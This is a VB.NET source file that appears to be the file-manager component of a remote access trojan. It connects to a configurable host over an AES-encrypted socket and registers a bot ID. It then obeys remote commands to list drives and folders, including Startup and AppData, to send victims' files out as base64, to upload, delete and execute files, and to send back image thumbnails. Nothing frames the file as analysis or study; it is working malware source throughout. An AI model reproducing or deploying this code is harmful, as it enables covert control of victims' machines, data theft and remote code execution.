Imports System.Net.Sockets
Imports System.Security.Cryptography

Public Class Main

    Public Shared C As TcpClient = Nothing
    Public Shared ENDOF As String
    Public Shared HOST As String
    Public Shared PORT As Integer
    Public Shared SPL As String
    Public Shared PASS As String
    Public Shared M As New IO.MemoryStream
    Public Shared FULLPATH As String
    Public Shared HWID As String
    Public Shared BOT As String
    Public Shared Pastebin As String

    Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)

        ENDOF = K
        HOST = H
        PORT = P
        SPL = SP
        PASS = PW
        FULLPATH = FP
        HWID = HW
        BOT = BT
        Pastebin = PB

        Dim lp As Integer = 0

        ' clear things and ReConnect
        Alive = False
        Try
            C.Client.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            M.Dispose()
        Catch ex As Exception
        End Try
        M = New IO.MemoryStream
        Try
            C = New Net.Sockets.TcpClient
            C.ReceiveTimeout = -1
            C.SendTimeout = -1
            C.SendBufferSize = 999999
            C.ReceiveBufferSize = 999999
            C.Client.SendBufferSize = 999999
            C.Client.ReceiveBufferSize = 999999
            lp = 0
            C.Client.Connect(H, P)
            Alive = True
            Send("OFM" + SPL + BOT)
        Catch ex As Exception
            GoTo cc
        End Try
        GoTo re
re:
        Try
            If C Is Nothing Then GoTo cc
            If C.Client.Connected = False Then GoTo cc
            If Alive = False Then GoTo cc
            lp += 1
            If lp > 1000 Then
                lp = 0
                ' check if i am still connected
                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo cc
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(K) Then ' split packet..
                    Dim A As Array = SplitByWord(M.ToArray, K)
                    Dim T As New Threading.Thread(AddressOf Data)
                    T.Start(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        Threading.Thread.Sleep(1)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo cc
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
cc:
        CloseMe()
    End Sub

    Public Shared Sub CloseMe()
        Threading.Thread.Sleep(1)
        Try
            C.Client.Close()
        Catch ex As Exception
        End Try
        Try
            C.Close()
        Catch ex2 As Exception
        End Try
        C = Nothing
        Try
            M.Dispose()
        Catch ex3 As Exception
        End Try
    End Sub

    Public Shared Sub Data(ByVal b As Byte())
        Dim A As String() = Split(AES_Decrypt(BS(b)), SPL)

        Try
            Select Case A(0)
                Case "Drivers"
                    Send("FM" & SPL & BOT & SPL & FMDrives())
                    Exit Select

                Case "FM"
                    Send("FM" & SPL & BOT & SPL & FMFolders(A(1)) & FMFiles(A(1)))
                    Exit Select

                Case "DW"
                    If IO.File.Exists(A(1)) Then
                        Send("DW" + SPL + BOT + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) + SPL + IO.Path.GetFileName(A(1)))
                    End If
                    Exit Select

                Case "UP"
                    IO.File.WriteAllBytes(A(1), GZip(Convert.FromBase64String(A(2)), False))
                    Send("UP" + SPL + BOT + SPL + IO.Path.GetFileName(A(1)))
                    Exit Select

                Case "DEL"
                    If IO.File.Exists(A(1)) Then
                        IO.File.Delete(A(1))
                        Send("DEL" + SPL + BOT)
                    End If
                    Exit Select

                Case "GOTO"
                    Select Case A(1)
                        Case "Desktop"
                            Send("FM" & SPL & BOT & SPL & FMFolders(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)) & FMFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)) & SPL & Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
                            Exit Select

                        Case "AppData"
                            Send("FM" & SPL & BOT & SPL & FMFolders(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) & FMFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) & SPL & Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
                            Exit Select

                        Case "Temp"
                            Send("FM" & SPL & BOT & SPL & FMFolders(Environ("Temp")) & FMFiles(Environ("Temp")) & SPL & Environ("Temp"))
                            Exit Select

                        Case "User"
                            Send("FM" & SPL & BOT & SPL & FMFolders(Environ("UserProfile")) & FMFiles(Environ("UserProfile")) & SPL & Environ("UserProfile"))
                            Exit Select

                        Case "Startup"
                            Send("FM" & SPL & BOT & SPL & FMFolders(Environment.GetFolderPath(Environment.SpecialFolder.Startup)) & FMFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup)) & SPL & Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                            Exit Select
                    End Select

                Case "PRE"
                    Try
                        Dim MM As New IO.MemoryStream
                        Dim BM As New Drawing.Bitmap(A(1))
                        Dim TUMB As New Drawing.Bitmap(250, 250)
                        Dim G As Drawing.Graphics = Drawing.Graphics.FromImage(TUMB)
                        G.InterpolationMode = Drawing.Drawing2D.InterpolationMode.Bicubic
                        G.DrawImage(BM, New Drawing.Rectangle(0, 0, 250, 250), New Drawing.Rectangle(0, 0, BM.Width, BM.Height), Drawing.GraphicsUnit.Pixel)
                        G.Dispose()
                        BM.Dispose()
                        TUMB.Save(MM, System.Drawing.Imaging.ImageFormat.Jpeg)
                        Send("PRE" & SPL & BOT & SPL & Text.Encoding.Default.GetString(MM.ToArray))
                        MM.Dispose()
                        TUMB.Dispose()
                        Exit Select
                    Catch ex As Exception
                    End Try
                    Exit Select

                Case "RUN"
                    If IO.File.Exists(A(1)) Then
                        Process.Start(A(1))
                    End If
                    Exit Select

                Case "Close"
                    CloseMe()
            End Select
        Catch ex As Exception
            Send("FM" & SPL & BOT & SPL & "Error " + SPL + ex.Message)
        End Try

    End Sub

    Public Shared Function FMFolders(ByVal location) As String
        On Error Resume Next
        Dim di As New IO.DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As IO.DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "|SPL_FM||SPL_FM|"
        Next
        Return folders
    End Function

    Public Shared Function FMFiles(ByVal location) As String
        On Error Resume Next
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "|SPL_FM|" & f.Length.ToString & "|SPL_FM|"
        Next
        Return files
    End Function

    Public Shared Function FMDrives() As String
        On Error Resume Next
        Dim allDrives As String = ""
        For Each d As IO.DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 0
                    allDrives += "[CD]" & d.Name & "|SPL_FM||SPL_FM|"
                Case 2
                    allDrives += "[CD]" & d.Name & "|SPL_FM||SPL_FM|"
                Case 3
                    allDrives += "[Drive]" & d.Name & "|SPL_FM||SPL_FM|"
                Case 4
                    allDrives += "[CD]" & d.Name & "|SPL_FM||SPL_FM|"
                Case 5
                    allDrives += "[CD]" & d.Name & "|SPL_FM||SPL_FM|"
            End Select
        Next
        Return allDrives
    End Function

    Public Shared Function SplitByWord(ByVal b As Byte(), ByVal WORD As String) As Array
        On Error Resume Next
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WORD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WORD.Length, b.Length - (T(0).Length + WORD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function

    Public Shared Sub Send(ByVal b As Byte())
        If Alive = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(ENDOF), 0, ENDOF.Length)
            C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            Alive = False
        End Try
    End Sub

    Public Shared Sub Send(ByVal S As String)
        Send(SB(AES_Encrypt(S)))
    End Sub

    Public Shared Alive As Boolean = False

    Public Shared Function SB(ByVal s As String) As Byte()
        Return Text.Encoding.UTF8.GetBytes(s)
    End Function

    Public Shared Function BS(ByVal b As Byte()) As String
        Return Text.Encoding.UTF8.GetString(b)
    End Function

    Public Shared Function AES_Encrypt(ByVal input As String)

        Dim AES As New RijndaelManaged
        Dim Hash_AES As New MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(SB(PASS))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = SB(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
        End Try
    End Function

    Public Shared Function AES_Decrypt(ByVal input As String)
        Dim AES As New RijndaelManaged
        Dim Hash_AES As New MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(SB(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = BS(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
        End Try
    End Function

    Public Shared Function GZip(ByVal B As Byte(), ByRef CM As Boolean) As Byte()
        If CM Then
            Dim MS As New IO.MemoryStream
            Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Compress, True)
            Ziped.Write(B, 0, B.Length)
            Ziped.Dispose()
            MS.Position = 0
            Dim buffer As Byte() = New Byte((CInt(MS.Length) + 1) - 1) {}
            MS.Read(buffer, 0, buffer.Length)
            MS.Dispose()
            Return buffer
        Else
            Dim MS As New IO.MemoryStream(B)
            Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
            Dim buffer As Byte() = New Byte(4 - 1) {}
            MS.Position = (MS.Length - 5)
            MS.Read(buffer, 0, 4)
            Dim count As Integer = BitConverter.ToInt32(buffer, 0)
            MS.Position = 0
            Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
            Ziped.Read(array, 0, count)
            Ziped.Dispose()
            MS.Dispose()
            Return array
        End If
    End Function



End Class
